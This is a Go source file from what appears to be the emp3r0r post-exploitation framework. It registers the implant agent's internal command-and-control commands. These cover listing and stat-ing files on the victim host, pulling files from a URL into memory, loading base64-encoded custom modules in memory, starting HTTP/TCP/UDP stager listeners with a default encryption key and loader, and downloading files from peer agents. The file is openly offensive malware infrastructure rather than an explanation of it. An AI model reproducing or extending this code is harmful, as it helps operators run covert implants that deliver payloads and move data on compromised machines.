/*
Package handler defines the command handlers for the agent.

This file (c2cmd.go) registers "C2 Commands" which are prefixed with "!".
These are intended as internal APIs for the operator's background tasks
(e.g., auto-completion, status checks, automated modules).
They are NOT intended for direct human interaction.
*/
package handler

import (
	"strings"

	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/spf13/cobra"
)

// C2Commands returns a root cobra.Command for C2 commands.
func C2Commands() *cobra.Command {
	rootCmd := &cobra.Command{
		Short: "agent commands",
	}

	// Add command groups for categorization
	rootCmd.AddGroup(
		&cobra.Group{ID: "generic", Title: "Generic Commands"},
		&cobra.Group{ID: "linux", Title: "Linux Commands"},
		&cobra.Group{ID: "windows", Title: "Windows Commands"},
	)
	rootCmd.PersistentFlags().StringP("job_id", "", "", "Job ID")

	// Generic commands group
	// !ls_dir is an API for path auto-completion in the operator's shell
	lsCmd := &cobra.Command{
		Use:     def.C2CmdListDir,
		Short:   "List directory entries",
		Example: "!ls_dir --path <path>",
		GroupID: "generic",
		Run:     runListDir,
	}
	lsCmd.Flags().StringP("path", "p", "", "Path to list")
	lsCmd.RegisterFlagCompletionFunc("path", memFileCompletion)
	rootCmd.AddCommand(lsCmd)

	// C2 Stat command
	statCmd := &cobra.Command{
		Use:     def.C2CmdStat,
		Short:   "Retrieve file statistics",
		Example: "!stat --path <path>",
		GroupID: "generic",
		Run:     runStat,
	}
	statCmd.Flags().StringP("path", "p", "", "Path to stat")
	statCmd.RegisterFlagCompletionFunc("path", memFileCompletion)
	rootCmd.AddCommand(statCmd)

	// C2 Put command
	putCmd := &cobra.Command{
		Use:     "put",
		Short:   "Upload file to agent",
		Example: "!put --path <path> --addr <url> --mem <bool> --force <bool>",
		GroupID: "generic",
		Run:     putCmdRun,
	}
	putCmd.Flags().StringP("path", "p", "", "Path to save file on agent")
	putCmd.Flags().StringP("addr", "", "", "Download address")
	putCmd.Flags().BoolP("mem", "m", false, "Save file to memory")
	putCmd.Flags().BoolP("force", "", false, "Force write to disk if memory is unavailable")
	putCmd.RegisterFlagCompletionFunc("path", memFileCompletion)
	rootCmd.AddCommand(putCmd)

	// C2 Custom Module command
	customModuleCmd := &cobra.Command{
		Use:     def.C2CmdCustomModule,
		Short:   "Load a custom module",
		Example: "!custom_module --mod_name <name> --invocation <base64> --checksum <checksum> --in_mem <bool> --type <payload_type> --file_to_download <file> --peer <ip>",
		GroupID: "generic",
		Run:     runCustomModule,
	}
	customModuleCmd.Flags().StringP("mod_name", "m", "", "Module name")
	customModuleCmd.Flags().StringP("invocation", "v", "", "Base64-encoded invocation payload")
	customModuleCmd.Flags().StringP("checksum", "c", "", "Checksum")
	customModuleCmd.Flags().BoolP("in_mem", "i", false, "Load module in memory")
	customModuleCmd.Flags().StringP("type", "t", "", "Payload type")
	customModuleCmd.Flags().StringP("file_to_download", "f", "", "File to download")
	customModuleCmd.RegisterFlagCompletionFunc("file_to_download", memFileCompletion)
	customModuleCmd.Flags().StringP("peer", "d", "", "Peer agent IP")
	rootCmd.AddCommand(customModuleCmd)

	// C2 Listener command
	listenerCmd := &cobra.Command{
		Use:     def.C2CmdListener,
		Short:   "Manage listeners (start/list/stop)",
		Example: "!listener --action start --type <http/tcp/udp> --port <port> --stager <path> --key <key> [--loader <path>]\n!listener --action list\n!listener --action stop --type <http/tcp/udp> [--port <port>]",
		GroupID: "generic",
		Run:     runListener,
	}
	listenerCmd.Flags().StringP("action", "a", "start", "Action: start, list, or stop")
	listenerCmd.Flags().StringP("type", "t", "http", "Listener type: http, tcp, or udp")
	listenerCmd.Flags().StringP("port", "p", "8080", "Port")
	listenerCmd.Flags().StringP("stager", "s", "", "Path to stager payload")
	listenerCmd.Flags().StringP("key", "k", "my_secret_key", "Encryption key for stager")
	listenerCmd.Flags().StringP("loader", "l", "", "Optional path to loader.bin for stage-1 prepend")
	rootCmd.AddCommand(listenerCmd)

	// C2 File Downloader command
	fileDownloaderCmd := &cobra.Command{
		Use:     def.C2CmdFileDownloader,
		Short:   "Download file",
		Example: "!file_downloader --peer <ip> --path <path> --checksum <checksum>",
		GroupID: "generic",
		Run:     runFileDownloader,
	}
	fileDownloaderCmd.Flags().StringP("peer", "u", "", "Peer agent IP to download from")
	fileDownloaderCmd.Flags().StringP("path", "p", "", "Path to save")
	fileDownloaderCmd.RegisterFlagCompletionFunc("path", memFileCompletion)
	fileDownloaderCmd.Flags().StringP("checksum", "c", "", "Checksum")
	rootCmd.AddCommand(fileDownloaderCmd)

	platformCommands(rootCmd)

	return rootCmd
}

// memFileCompletion completes mem:// paths with hierarchical completion
func memFileCompletion(cmd *cobra.Command, args []string, toComplete string) ([]string, cobra.ShellCompDirective) {
	if strings.HasPrefix(toComplete, "mem://") {
		// Use hierarchical completion like the ls command does
		files := util.ListMemFiles()
		return getMemFileCompletions(toComplete, files), cobra.ShellCompDirectiveNoFileComp
	}
	return nil, cobra.ShellCompDirectiveDefault
}
